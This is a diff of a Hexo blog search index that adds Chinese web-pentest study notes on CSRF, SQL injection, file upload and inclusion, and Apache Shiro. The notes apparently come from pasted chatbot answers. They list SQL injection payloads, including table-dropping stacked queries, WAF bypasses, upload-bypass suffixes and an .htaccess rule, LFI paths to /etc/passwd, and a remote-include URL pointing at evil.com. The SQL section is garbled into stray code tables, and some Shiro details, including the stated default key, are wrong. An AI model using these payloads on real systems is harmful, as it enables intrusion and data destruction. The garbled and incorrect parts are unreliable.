@@ -4,6 +4,45 @@
   
     
     <entry>
+      <title></title>
+      <link href="/2025/11/24/mvc/"/>
+      <url>/2025/11/24/mvc/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2025/11/01/sql%E6%B3%A8%E5%85%A5/"/>
+      <url>/2025/11/01/sql%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p>title: sql注入</p><p>date: 2025-07-21 16:18:55<br>tags: </p><pre><code> - 学习      - 网络渗透</code></pre><p>categories:<br>          - 网络渗透<br>keywords:<br>description: sql注入<br>top_img: transparent<br>cover: </p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2025/09/10/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+      <url>/2025/09/10/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>JAVA基础</title>
       <link href="/2025/07/21/JAVA%E5%85%A5%E9%97%A8/"/>
       <url>/2025/07/21/JAVA%E5%85%A5%E9%97%A8/</url>
@@ -185,6 +224,141 @@
             <tag> 学习 </tag>
             
             <tag> php </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CSRF攻击</title>
+      <link href="/2025/07/21/CSRF%E6%94%BB%E5%87%BB/"/>
+      <url>/2025/07/21/CSRF%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CSRF-攻击（Cross-Site-Request-Forgery）"><a href="#CSRF-攻击（Cross-Site-Request-Forgery）" class="headerlink" title="CSRF 攻击（Cross-Site Request Forgery）"></a>CSRF 攻击（Cross-Site Request Forgery）</h1><p><strong>中心主题</strong>：CSRF 攻击（跨站请求伪造）</p><hr><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>攻击建立在浏览器与 Web 服务器的<strong>会话</strong>（Session&#x2F;Cookie）之中</li><li>攻击者<strong>不需要</strong>知道受害者的 Cookie 值</li><li>开发者未对会话设置 <strong>Token</strong> 或 <strong>Referer</strong> 验证，也未使用验证码等二次确认措施</li><li>浏览器在<strong>同源会话</strong>下自动携带 Cookie 发起请求</li></ol><hr><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>用当前登录用户的权限执行任意操作</li><li>常见后果：<ul><li>修改密码</li><li>新增管理员账号</li><li>修改个人信息</li><li>转账 &#x2F; 支付</li><li>删除数据</li><li>发帖 &#x2F; 评论（垃圾信息）</li><li>获取 Shell（如果结合文件上传等功能）</li></ul></li></ul><hr><h2 id="攻击流程（典型场景）"><a href="#攻击流程（典型场景）" class="headerlink" title="攻击流程（典型场景）"></a>攻击流程（典型场景）</h2><ol><li>用户 C 正常登录网站 A，浏览器保存了 Cookie&#x2F;Session</li><li>用户 C 在同一浏览器中访问恶意网站 B（或点击恶意链接、邮件、论坛图片等）</li><li>网站 B 返回恶意页面，包含自动触发的请求（img、form、iframe、XMLHttpRequest 等）</li><li>浏览器在用户不知情的情况下，向网站 A 发起带有 Cookie 的请求</li><li>网站 A 收到请求，认为来自合法用户 C，执行恶意操作</li></ol><hr><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1-站外-CSRF（最常见）"><a href="#1-站外-CSRF（最常见）" class="headerlink" title="1. 站外 CSRF（最常见）"></a>1. 站外 CSRF（最常见）</h3><ul><li>攻击代码位于第三方网站（B站）</li><li>常见触发方式：<ul><li>恶意链接（GET）</li><li>自动提交的隐藏表单（POST）</li><li><code>&lt;img src=&quot;...&quot;&gt;</code> 标签（GET）</li><li>JSONP、Flash 等旧方式</li></ul></li></ul><h3 id="2-站内-CSRF"><a href="#2-站内-CSRF" class="headerlink" title="2. 站内 CSRF"></a>2. 站内 CSRF</h3><ul><li>攻击代码位于目标网站内部（A站）</li><li>常见原因：<ul><li>开发者滥用 <code>$_REQUEST</code>（同时接收 GET 和 POST）</li><li>本应只接受 POST 的敏感操作，却也接受了 GET 请求</li></ul></li><li>攻击者可通过站内留言、评论、头像、文章插入恶意链接或图片</li></ul><hr><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><h3 id="1-使用-CSRF-测试工具"><a href="#1-使用-CSRF-测试工具" class="headerlink" title="1. 使用 CSRF 测试工具"></a>1. 使用 CSRF 测试工具</h3><ul><li><strong>CSRF Tester</strong> &#x2F; CSRF PoC 生成器<ul><li>抓取正常请求包</li><li>修改参数后重新提交</li><li>如果成功执行 → 存在 CSRF</li></ul></li></ul><h3 id="2-手工检测"><a href="#2-手工检测" class="headerlink" title="2. 手工检测"></a>2. 手工检测</h3><ul><li>抓取一个正常敏感操作的请求包</li><li>去掉 Referer 头后重新提交</li><li>如果仍成功 → 基本存在 CSRF（未校验 Referer）</li><li>构造站外页面，模拟请求，观察是否被执行</li></ul><hr><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><h3 id="服务端防护（推荐优先级最高）"><a href="#服务端防护（推荐优先级最高）" class="headerlink" title="服务端防护（推荐优先级最高）"></a>服务端防护（推荐优先级最高）</h3><ol><li><p><strong>使用 CSRF Token</strong>（最有效、最推荐）</p><ul><li>每个表单&#x2F;请求携带唯一、不可预测的 Token</li><li>Token 存放在隐藏字段、Header 或 URL 中</li><li>服务端校验 Token 是否匹配当前会话</li></ul></li><li><p><strong>验证 HTTP Referer 头</strong></p><ul><li>检查 Referer 是否属于本站域名</li><li>缺点：可被伪造 &#x2F; 浏览器&#x2F;代理可能不发送 Referer</li></ul></li><li><p><strong>自定义 HTTP Header 验证</strong></p><ul><li>如 <code>X-CSRF-Token</code>、<code>X-Requested-With: XMLHttpRequest</code></li><li>浏览器同源策略限制跨域自定义头</li></ul></li><li><p><strong>严格区分 GET 和 POST</strong></p><ul><li>敏感操作（如改密、转账）<strong>只接受 POST</strong></li><li>GET 请求一律不允许修改数据</li></ul></li><li><p><strong>使用验证码 &#x2F; 二次确认</strong></p><ul><li>高危操作要求输入验证码或二次密码</li></ul></li></ol><h3 id="客户端防护（辅助）"><a href="#客户端防护（辅助）" class="headerlink" title="客户端防护（辅助）"></a>客户端防护（辅助）</h3><ul><li>用户安全意识培训</li><li>浏览器插件（如 NoScript、uBlock Origin 拦截可疑请求）</li><li>及时更新浏览器，开启 SameSite Cookie 属性</li></ul><h3 id="浏览器安全特性"><a href="#浏览器安全特性" class="headerlink" title="浏览器安全特性"></a>浏览器安全特性</h3><ul><li><strong>SameSite Cookie</strong>（推荐）<ul><li><code>Strict</code>：完全禁止跨站携带</li><li><code>Lax</code>：允许顶级导航（GET）携带，阻止 POST 等</li><li><code>None</code>：需配合 Secure 属性</li></ul></li></ul><hr><h2 id="快速记忆口诀"><a href="#快速记忆口诀" class="headerlink" title="快速记忆口诀"></a>快速记忆口诀</h2><p><strong>CSRF 三要素缺一不可</strong>：</p><ol><li>用户已登录（有有效 Cookie&#x2F;Session）</li><li>攻击者诱导用户访问恶意页面&#x2F;点击链接</li><li>目标网站<strong>未做</strong> Token &#x2F; Referer &#x2F; SameSite 等防护</li></ol><p><strong>最强防御组合</strong>：<br>CSRF Token + SameSite&#x3D;Lax&#x2F;Strict + POST 限制 + Referer 白名单校验</p><hr><p>如需补充：</p><ul><li>具体 CSRF PoC 示例代码</li><li>SameSite 属性详细对比表</li><li>某框架（如 Spring、Django、Laravel）的 Token 实现方式<br>随时告诉我，我继续完善！</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> web渗透 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 学习 </tag>
+            
+            <tag> web渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sql注入（理论）</title>
+      <link href="/2025/07/21/sql%E6%B3%A8%E5%85%A5%EF%BC%88%E7%90%86%E8%AE%BA%EF%BC%89/"/>
+      <url>/2025/07/21/sql%E6%B3%A8%E5%85%A5%EF%BC%88%E7%90%86%E8%AE%BA%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQL注入（SQL-Injection）"><a href="#SQL注入（SQL-Injection）" class="headerlink" title="SQL注入（SQL Injection）"></a>SQL注入（SQL Injection）</h1><p><strong>中心主题</strong>：SQL注入</p><hr><h2 id="1-注入位置分类"><a href="#1-注入位置分类" class="headerlink" title="1. 注入位置分类"></a>1. 注入位置分类</h2><h3 id="1-1-WHERE-子句注入（最常见）"><a href="#1-1-WHERE-子句注入（最常见）" class="headerlink" title="1.1 WHERE 子句注入（最常见）"></a>1.1 WHERE 子句注入（最常见）</h3><ul><li>登录框（用户名 &#x2F; 密码）</li><li>搜索框</li><li>GET&#x2F;POST 参数（如 id、name、keyword）</li><li>典型 payload：<ul><li><code>&#39; or 1=1 --</code></li><li><code>&#39; or &#39;1&#39;=&#39;1</code></li><li><code>admin&#39; --</code></li><li><code>&#39;) or (&#39;1&#39;=&#39;1</code></li></ul></li></ul><h3 id="1-2-ORDER-BY-注入"><a href="#1-2-ORDER-BY-注入" class="headerlink" title="1.2 ORDER BY 注入"></a>1.2 ORDER BY 注入</h3><ul><li>常出现在排序参数（如 order&#x3D;asc &#x2F; desc）</li><li>典型 payload：<ul><li><code>order by 1--</code></li><li><code>order by 999--</code> （报错判断字段数）</li><li><code>order by rand()</code> （盲注）</li></ul></li></ul><h3 id="1-3-GROUP-BY-HAVING-注入"><a href="#1-3-GROUP-BY-HAVING-注入" class="headerlink" title="1.3 GROUP BY &#x2F; HAVING 注入"></a>1.3 GROUP BY &#x2F; HAVING 注入</h3><ul><li>较少见，通常与聚合函数结合</li></ul><h3 id="1-4-LIMIT-OFFSET-注入"><a href="#1-4-LIMIT-OFFSET-注入" class="headerlink" title="1.4 LIMIT &#x2F; OFFSET 注入"></a>1.4 LIMIT &#x2F; OFFSET 注入</h3><ul><li>翻页参数</li><li>payload：<code>1 union select 1,2,3 limit 0,1</code></li></ul><h3 id="1-5-UPDATE-INSERT-注入"><a href="#1-5-UPDATE-INSERT-注入" class="headerlink" title="1.5 UPDATE &#x2F; INSERT 注入"></a>1.5 UPDATE &#x2F; INSERT 注入</h3><ul><li>修改个人信息、注册、评论等</li><li>payload 示例：<ul><li><code>&#39;, (select database()) , &#39;</code></li><li><code>1; update users set password=&#39;123&#39; where id=1 --</code></li></ul></li></ul><h3 id="1-6-其他位置"><a href="#1-6-其他位置" class="headerlink" title="1.6 其他位置"></a>1.6 其他位置</h3><ul><li>Cookie 注入（较少）</li><li>HTTP Header 注入（User-Agent、Referer 等，极少）</li><li>文件名 &#x2F; 路径注入（日志投毒型）</li></ul><hr><h2 id="2-注入类型"><a href="#2-注入类型" class="headerlink" title="2. 注入类型"></a>2. 注入类型</h2><h3 id="2-1-报错注入（Error-Based）"><a href="#2-1-报错注入（Error-Based）" class="headerlink" title="2.1 报错注入（Error-Based）"></a>2.1 报错注入（Error-Based）</h3><ul><li>利用数据库报错信息直接回显数据</li><li>常见函数：<ul><li>MySQL：<code>extractvalue()</code>、<code>updatexml()</code>、<code>floor(rand(0)*2)</code></li><li>SQL Server：<code>CAST()</code>、<code>CONVERT()</code></li><li>Oracle：<code>dbms_xmlquery.newcontext()</code></li></ul></li></ul><h3 id="2-2-联合查询注入（Union-Based）"><a href="#2-2-联合查询注入（Union-Based）" class="headerlink" title="2.2 联合查询注入（Union-Based）"></a>2.2 联合查询注入（Union-Based）</h3><ul><li><p>字段数匹配后使用 <code>union select</code></p></li><li><p>经典 payload：</p><p>‘ union select 1,2,3,4,5 –+<br>‘ union select null,null,database(),user(),version() –+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.3 布尔盲注（Boolean-Based）</span><br><span class="line">- 通过页面真假变化判断</span><br><span class="line">- 典型 payload：</span><br></pre></td></tr></table></figure><p>‘ and 1&#x3D;1 –          （页面正常）<br>‘ and 1&#x3D;2 –          （页面异常）<br>‘ and ascii(substr(database(),1,1))&gt;64 – </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.4 时间盲注（Time-Based）</span><br><span class="line">- 通过响应延迟判断</span><br><span class="line">- 常见函数：</span><br><span class="line">  - MySQL：`sleep(5)`、`benchmark(5000000,md5(1))`</span><br><span class="line">  - SQL Server：`WAITFOR DELAY &#x27;0:0:5&#x27;`</span><br><span class="line">  - Oracle：`dbms_lock.sleep(5)`</span><br><span class="line">- payload 示例：</span><br></pre></td></tr></table></figure><p>‘ and if(1&#x3D;1,sleep(5),0) –<br>‘ and 1&#x3D;case when substring(database(),1,1)&#x3D;’a’ then sleep(5) else 0 end – </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.5 堆叠查询（Stacked Queries）</span><br><span class="line">- 支持多语句执行（; 分隔）</span><br><span class="line">- payload：</span><br></pre></td></tr></table></figure><p>‘; drop table users; –<br>‘; update users set password&#x3D;’hacked’ where id&#x3D;1; – </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 3. 常见数据库特征 payload</span><br><span class="line"></span><br><span class="line">### 3.1 MySQL / MariaDB</span><br><span class="line">- 当前数据库：`database()`、`schema()`</span><br><span class="line">- 当前用户：`user()`、`current_user()`</span><br><span class="line">- 版本：`version()`</span><br><span class="line">- 库表字段：</span><br></pre></td></tr></table></figure><p>information_schema.tables<br>information_schema.columns<br>information_schema.schemata</p></li></ul><h3 id="3-2-SQL-Server"><a href="#3-2-SQL-Server" class="headerlink" title="3.2 SQL Server"></a>3.2 SQL Server</h3><ul><li>当前数据库：<code>db_name()</code></li><li>当前用户：<code>user_name()</code>、<code>system_user</code></li><li>版本：<code>@@version</code></li><li>库表：<code>sys.databases</code>、<code>sys.tables</code>、<code>sys.columns</code></li></ul><h3 id="3-3-Oracle"><a href="#3-3-Oracle" class="headerlink" title="3.3 Oracle"></a>3.3 Oracle</h3><ul><li>当前用户：<code>user</code></li><li>版本：<code>banner from v$version</code></li><li>表：<code>all_tables</code>、<code>user_tables</code></li><li>列：<code>all_tab_columns</code></li></ul><h3 id="3-4-PostgreSQL"><a href="#3-4-PostgreSQL" class="headerlink" title="3.4 PostgreSQL"></a>3.4 PostgreSQL</h3><ul><li>当前数据库：<code>current_database()</code></li><li>当前用户：<code>current_user</code></li><li>版本：<code>version()</code></li><li>表：<code>pg_tables</code>、<code>information_schema.tables</code></li></ul><hr><h2 id="4-绕过方式（WAF-过滤）"><a href="#4-绕过方式（WAF-过滤）" class="headerlink" title="4. 绕过方式（WAF &#x2F; 过滤）"></a>4. 绕过方式（WAF &#x2F; 过滤）</h2><h3 id="4-1-空格-注释绕过"><a href="#4-1-空格-注释绕过" class="headerlink" title="4.1 空格 &#x2F; 注释绕过"></a>4.1 空格 &#x2F; 注释绕过</h3><ul><li><code>/**/</code>、<code>--</code>、<code>#</code>、<code>/* */</code></li><li><code>/*!50000select*/</code></li><li><code>select/**/1</code></li></ul><h3 id="4-2-大小写绕过"><a href="#4-2-大小写绕过" class="headerlink" title="4.2 大小写绕过"></a>4.2 大小写绕过</h3><ul><li><code>SeLeCt</code>、<code>uNiOn SeLeCt</code></li></ul><h3 id="4-3-编码绕过"><a href="#4-3-编码绕过" class="headerlink" title="4.3 编码绕过"></a>4.3 编码绕过</h3><ul><li>URL 编码：<code>%27</code>、<code>%20</code></li><li>双重编码</li><li>Unicode：<code>%u0027</code></li></ul><h3 id="4-4-内联注释绕过"><a href="#4-4-内联注释绕过" class="headerlink" title="4.4 内联注释绕过"></a>4.4 内联注释绕过</h3><ul><li><code>select/*!50000 version*/()</code></li></ul><h3 id="4-5-替代函数"><a href="#4-5-替代函数" class="headerlink" title="4.5 替代函数"></a>4.5 替代函数</h3><ul><li><code>substring()</code> → <code>mid()</code>、<code>substr()</code></li><li><code>sleep()</code> → <code>benchmark()</code>、<code>pg_sleep()</code></li></ul><h3 id="4-6-HTTP-参数污染-拆分"><a href="#4-6-HTTP-参数污染-拆分" class="headerlink" title="4.6 HTTP 参数污染 &#x2F; 拆分"></a>4.6 HTTP 参数污染 &#x2F; 拆分</h3><ul><li>多个同名参数</li><li><code>?id=1&amp;id=-1 union select...</code></li></ul><hr><h2 id="5-防御与修复建议"><a href="#5-防御与修复建议" class="headerlink" title="5. 防御与修复建议"></a>5. 防御与修复建议</h2><ul><li>使用<strong>参数化查询</strong>（Prepared Statements &#x2F; PDO）</li><li>使用 ORM（如 MyBatis、Hibernate、Django ORM、SQLAlchemy）</li><li>输入严格白名单过滤</li><li>最小权限原则（数据库用户只给必要权限）</li><li>WAF + 日志监控</li><li>错误信息屏蔽（不要回显数据库错误）</li></ul><hr><p><strong>快速记忆口诀</strong>（注入流程）：</p><ol><li>判断注入点（’ “ ) } 报错&#x2F;变化）</li><li>判断字段数（order by &#x2F; union select null,null…）</li><li>判断回显位置（union select 1,2,3…）</li><li>爆库名、表名、列名、数据</li><li>尝试提权 &#x2F; 写 shell（视权限）</li></ol><hr><p>如需补充具体数据库的完整 payload 字典、WAF 绕过案例、或某个漏洞的详细利用链，请继续告诉我！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web渗透 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 学习 </tag>
+            
+            <tag> web渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文件操作漏洞</title>
+      <link href="/2025/07/21/%E6%96%87%E4%BB%B6%E5%9C%A8%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2025/07/21/%E6%96%87%E4%BB%B6%E5%9C%A8%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="文件操作漏洞（File-Operation-Vulnerabilities）"><a href="#文件操作漏洞（File-Operation-Vulnerabilities）" class="headerlink" title="文件操作漏洞（File Operation Vulnerabilities）"></a>文件操作漏洞（File Operation Vulnerabilities）</h1><p><strong>中心主题</strong>：文件操作漏洞</p><hr><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>服务器和客户端对上传文件的验证不全面</li><li>允许用户直接上传恶意文件（如 webshell），或通过连接&#x2F;包含等方式执行</li></ul><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>直接获取 webshell → 服务器权限</li><li>读取敏感文件（配置文件、源码、数据库凭证）</li><li>远程代码执行（RCE）</li><li>数据泄露、后门植入、横向移动</li></ul><hr><h2 id="2-文件上传漏洞（最常见类型）"><a href="#2-文件上传漏洞（最常见类型）" class="headerlink" title="2. 文件上传漏洞（最常见类型）"></a>2. 文件上传漏洞（最常见类型）</h2><h3 id="2-1-客户端验证绕过"><a href="#2-1-客户端验证绕过" class="headerlink" title="2.1 客户端验证绕过"></a>2.1 客户端验证绕过</h3><ul><li>前端 JS 校验扩展名、大小、类型 → 可直接改包绕过</li><li>修改 Content-Type 为 image&#x2F;jpeg 等伪装</li></ul><h3 id="2-2-服务端验证绕过"><a href="#2-2-服务端验证绕过" class="headerlink" title="2.2 服务端验证绕过"></a>2.2 服务端验证绕过</h3><h4 id="常见黑名单绕过"><a href="#常见黑名单绕过" class="headerlink" title="常见黑名单绕过"></a>常见黑名单绕过</h4><ul><li>后缀绕过：<code>.php</code> → <code>.php5</code> <code>.phtml</code> <code>.php.</code> <code>.php;.jpg</code> <code>.php%00.jpg</code></li><li>双后缀：<code>shell.php.jpg</code> <code>shell.php;.jpg</code></li><li>大小写绕过：<code>.pHp</code> <code>.PhP</code></li><li>特殊字符：<code>shell.php.</code> <code>shell.php%20</code> <code>shell.php::$DATA</code>（Windows NTFS 特性）</li></ul><h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><ul><li><p><code>%00</code> 截断（早期 PHP &lt; 5.3.4 有效）</p></li><li><p><code>.htaccess</code> 上传恶意解析规则</p><p>AddType application&#x2F;x-httpd-php .jpg</p></li><li><p>Apache 解析顺序漏洞（多后缀时从右往左解析）</p></li></ul><h4 id="MIME-类型绕过"><a href="#MIME-类型绕过" class="headerlink" title="MIME 类型绕过"></a>MIME 类型绕过</h4><ul><li>Content-Type: image&#x2F;jpeg → 实际内容为 PHP 代码</li></ul><h4 id="其他绕过技巧"><a href="#其他绕过技巧" class="headerlink" title="其他绕过技巧"></a>其他绕过技巧</h4><ul><li>Apache + mod_negotiation：<code>shell.php.jpg</code> → Apache 可能解析为 <code>.php</code></li><li>Nginx + PHP-FPM：文件名后缀无关，取决于 fastcgi_param SCRIPT_FILENAME</li><li>Windows 短文件名：<code>progra~1</code>、<code>com1.php</code> 等</li></ul><h3 id="2-3-典型文件上传漏洞案例"><a href="#2-3-典型文件上传漏洞案例" class="headerlink" title="2.3 典型文件上传漏洞案例"></a>2.3 典型文件上传漏洞案例</h3><ul><li>PHP &lt; 5.3.4 的 <code>%00</code> 截断</li><li>Apache 2.4.x + 多后缀解析顺序</li><li>Nginx 配置不当（PATH_INFO 导致任意文件解析）</li><li>CMS 上传插件漏洞（dedecms、wordpress、phpmyadmin 等）</li></ul><hr><h2 id="3-文件包含漏洞（LFI-RFI）"><a href="#3-文件包含漏洞（LFI-RFI）" class="headerlink" title="3. 文件包含漏洞（LFI &#x2F; RFI）"></a>3. 文件包含漏洞（LFI &#x2F; RFI）</h2><h3 id="3-1-本地文件包含（LFI）"><a href="#3-1-本地文件包含（LFI）" class="headerlink" title="3.1 本地文件包含（LFI）"></a>3.1 本地文件包含（LFI）</h3><ul><li>include&#x2F;require&#x2F;include_once&#x2F;require_once</li><li>常见参数：<code>?page=../../etc/passwd</code> <code>?file=../../../../windows/win.ini</code></li><li>配合日志投毒：User-Agent 写入 webshell → 包含 access.log</li></ul><h3 id="3-2-远程文件包含（RFI）"><a href="#3-2-远程文件包含（RFI）" class="headerlink" title="3.2 远程文件包含（RFI）"></a>3.2 远程文件包含（RFI）</h3><ul><li>allow_url_include &#x3D; On（极少开启）</li><li><code>?page=http://evil.com/shell.txt</code></li></ul><h3 id="3-3-常见路径遍历绕过"><a href="#3-3-常见路径遍历绕过" class="headerlink" title="3.3 常见路径遍历绕过"></a>3.3 常见路径遍历绕过</h3><ul><li><code>../</code> <code>....//</code> <code>....\\</code> <code>./../</code> <code>%2e%2e%2f</code></li><li>URL 编码多次：<code>%252e%252e%252f</code></li><li>绝对路径：<code>/var/www/html/shell.php</code></li></ul><hr><h2 id="4-文件下载漏洞"><a href="#4-文件下载漏洞" class="headerlink" title="4. 文件下载漏洞"></a>4. 文件下载漏洞</h2><ul><li>任意文件下载：<code>?file=../../../../etc/passwd</code></li><li>未授权下载源码、配置文件、数据库备份</li><li>路径穿越 + 后缀黑名单绕过</li></ul><hr><h2 id="5-检测与利用思路"><a href="#5-检测与利用思路" class="headerlink" title="5. 检测与利用思路"></a>5. 检测与利用思路</h2><h3 id="5-1-上传成功判断"><a href="#5-1-上传成功判断" class="headerlink" title="5.1 上传成功判断"></a>5.1 上传成功判断</h3><ol><li>改名后缀为图片 → 上传 → 访问是否解析为 PHP</li><li>改 Content-Type → 上传 → 检查响应</li><li>上传 <code>&lt;?php phpinfo(); ?&gt;</code> → 访问看是否执行</li><li>上传 <code>.htaccess</code> + 图片马 → 测试解析</li></ol><h3 id="5-2-后缀爆破列表（常见可解析后缀）"><a href="#5-2-后缀爆破列表（常见可解析后缀）" class="headerlink" title="5.2 后缀爆破列表（常见可解析后缀）"></a>5.2 后缀爆破列表（常见可解析后缀）</h3><ul><li>php php3 php4 php5 phtml phar inc</li><li>jsp jspx asp aspx cer cdx</li><li>cgi pl py</li></ul><h3 id="5-3-上传路径猜测"><a href="#5-3-上传路径猜测" class="headerlink" title="5.3 上传路径猜测"></a>5.3 上传路径猜测</h3><ul><li>&#x2F;upload&#x2F; &#x2F;uploads&#x2F; &#x2F;files&#x2F; &#x2F;images&#x2F; &#x2F;attachment&#x2F;</li><li>&#x2F;upfiles&#x2F; &#x2F;file&#x2F; &#x2F;tmp&#x2F; &#x2F;data&#x2F;</li></ul><hr><h2 id="6-修复建议"><a href="#6-修复建议" class="headerlink" title="6. 修复建议"></a>6. 修复建议</h2><h3 id="服务端修复"><a href="#服务端修复" class="headerlink" title="服务端修复"></a>服务端修复</h3><ol><li><strong>白名单校验</strong>文件扩展名（而非黑名单）</li><li><strong>重命名</strong>上传文件（随机文件名 + 固定后缀）</li><li><strong>禁止执行权限</strong>：上传目录设置 <code>php_flag engine off</code> 或 <code>Options -ExecCGI</code></li><li><strong>MIME 类型二次校验</strong>（使用 getimagesize &#x2F; finfo）</li><li><strong>限制上传大小</strong> &amp; <strong>禁止 .htaccess 上传</strong></li><li><strong>关闭危险函数</strong>：<code>allow_url_include=Off</code> <code>allow_url_fopen</code> 谨慎开启</li></ol><h3 id="配置层面"><a href="#配置层面" class="headerlink" title="配置层面"></a>配置层面</h3><ul><li>Apache：<code>php_admin_flag engine off</code> 在上传目录</li><li>Nginx：<code>location ~* \.(php|php5|phtml)$ &#123; deny all; &#125;</code> 在上传目录</li><li>上传目录与 Web 根目录分离</li></ul><hr><h2 id="7-典型-CVE-案例参考"><a href="#7-典型-CVE-案例参考" class="headerlink" title="7. 典型 CVE &#x2F; 案例参考"></a>7. 典型 CVE &#x2F; 案例参考</h2><ul><li>CVE-2015-XXXX：各种 CMS 上传绕过</li><li>CVE-2018-XXXX：phpMyAdmin 文件上传</li><li>CVE-2019-XXXX：ThinkPHP &#x2F; Laravel 等框架上传</li><li>图片马 + .htaccess 组合拳</li><li>Nginx + PHP-FPM 路径解析漏洞</li></ul><hr><p><strong>一句话总结防御</strong>：<br>“<strong>上传目录绝不解析 PHP + 文件名不可控 + 白名单校验 + MIME 验证</strong>” 是最稳组合。</p><p>如需补充：</p><ul><li>具体 webshell 一句话木马</li><li>图片马制作方法</li><li>常见 CMS 上传点位置</li><li>最新绕过技巧（2024-2025）<br>随时告诉我，我继续扩展！</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> web渗透 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 学习 </tag>
+            
+            <tag> web渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>框架漏洞</title>
+      <link href="/2025/07/21/%E6%BA%90%E7%A0%81%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2025/07/21/%E6%BA%90%E7%A0%81%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="源码框架漏洞"><a href="#源码框架漏洞" class="headerlink" title="源码框架漏洞"></a>源码框架漏洞</h1><p><strong>中心主题</strong>：源码框架漏洞</p><hr><h2 id="1-Apache-Shiro"><a href="#1-Apache-Shiro" class="headerlink" title="1. Apache Shiro"></a>1. Apache Shiro</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Apache Shiro 是一款开源安全框架。使用时需要配置 <code>ShiroFilter</code> 等组件，用于认证和授权等安全功能。<br>常见配置中会用到 <code>rememberMe</code> Cookie（记住我功能）。</p><h3 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h3><ul><li><strong>受影响版本</strong>：Apache Shiro ≤ 1.2.4（部分资料标注为 1.2.4 版本）</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>rememberMe</code> Cookie 的处理流程：</p><ol><li>用户登录成功后生成 <code>rememberMe</code> Cookie 值</li><li>使用 AES 加密</li><li>Base64 编码后存入 Cookie</li><li>下次访问时服务器解密并反序列化</li></ol><h3 id="漏洞分支"><a href="#漏洞分支" class="headerlink" title="漏洞分支"></a>漏洞分支</h3><h4 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h4><ul><li><strong>原理</strong>：<code>rememberMe</code> Cookie 反序列化漏洞（CC 链）</li><li><strong>触发点</strong>：<code>Shiro</code> 内置的 <code>CookieRememberMeManager</code> 在解密后直接反序列化</li><li><strong>影响</strong>：远程命令执行（RCE）</li><li><strong>修复</strong>：<ul><li>升级 Shiro 至 ≥ 1.2.5</li><li>或自定义 <code>RememberMeManager</code> 并禁用反序列化</li></ul></li></ul><h4 id="Shiro-721"><a href="#Shiro-721" class="headerlink" title="Shiro-721"></a>Shiro-721</h4><ul><li><strong>原理</strong>：AES 加密密钥可被爆破（默认密钥泄露）</li><li><strong>触发点</strong>：<code>Shiro</code> 默认使用硬编码密钥 <code>kPH+bIxk5D2O9v8y9f1z3w==</code></li><li><strong>影响</strong>：可构造恶意 